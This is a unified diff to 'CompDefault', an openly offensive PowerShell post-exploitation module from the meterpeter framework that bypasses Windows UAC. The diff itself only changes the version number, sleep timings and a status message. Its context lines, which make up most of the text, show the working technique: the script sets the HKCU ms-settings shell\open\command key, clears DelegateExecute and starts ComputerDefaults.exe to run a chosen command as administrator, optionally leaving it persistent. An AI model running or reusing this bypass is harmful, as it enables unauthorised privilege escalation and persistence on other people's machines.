@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
    CompDefault can be used has UAC bypass module or to execute one command with high privileges (Admin)
 
@@ -88,7 +88,7 @@ If(-not($param1) -or $param1 -eq $null){
 }
 
 ## CompDefault meterpeter post-module banner
-Write-Host "`nCompDefault v1.0 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
+Write-Host "`nCompDefault v1.1 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
 Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 400
 
 ## Check for regedit vulnerable HIVE existence before continue any further ..
@@ -125,24 +125,25 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    If(-not(Test-Path "HKCU:\Software\Classes\ms-settings\shell\open\Command") -and $param2 -iNotMatch '-Force'){
       If(Test-Path "$Env:TMP\CompDefault.ps1"){Remove-Item -Path "$Env:TMP\CompDefault.ps1" -Force -EA SilentlyContinue}
       Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
-      Write-Host "[ ] CompDefault can't create the required registry key. (AV?)`n" -ForegroundColor red -BackgroundColor Black
+      Write-Host "[ ] CompDefault can't create the required registry key. (AV?)" -ForegroundColor red -BackgroundColor Black
+      Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command`n"
       Exit
    }
 
    ### Add Entrys to Regedit { using powershell }
    Write-Host "[+] Hijacking => ComputerDefaults.exe execution in registry."
    # New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
-   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null;Start-Sleep -Milliseconds 400
+   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null;Start-Sleep -Milliseconds 380
    ## The Next Registry entry allow us to execute our command under high privileges (Admin)
-   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$Command" -Force|Out-Null;Start-Sleep -Milliseconds 400
+   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$Command" -Force|Out-Null;Start-Sleep -Milliseconds 380
 
    ## Start the vulnerable Process { using powershell }
    Write-Host "[+] Hijacking => ComputerDefaults.exe process execution."
-   Start-Sleep -Milliseconds 3000;Start-Process "$Env:WINDIR\System32\ComputerDefaults.exe"
+   Start-Sleep -Milliseconds 2700;Start-Process "$Env:WINDIR\System32\ComputerDefaults.exe"
    ## '$LASTEXITCODE' contains the exit code of the last Win32 executable execution
    If($LASTEXITCODE -eq 0){$ReturnCode = "0-"}Else{$ReturnCode = "1-"}
 
-   Start-Sleep -Milliseconds 3000 # Give time for ComputerDefaults.exe to finish
+   Start-Sleep -Milliseconds 2800 # Give time for ComputerDefaults.exe to finish
    ## If '$MakeItPersistence' is set to "True" then the EOP registry hacks will NOT
    # be deleted in the end of cmdlet execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
@@ -204,6 +205,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 
    ## Audit Spawn Process Group Owner
    # Function to audit [binary|script|command] Tokens
+   Start-Sleep -Milliseconds 500
    If($ProcessName -Match '[.exe]$'){
       $ProcessToken = "$ProcessName";$ReturnCode = "$ReturnCode"+":1"
       $ProcessName = $ProcessName -replace '.exe',''
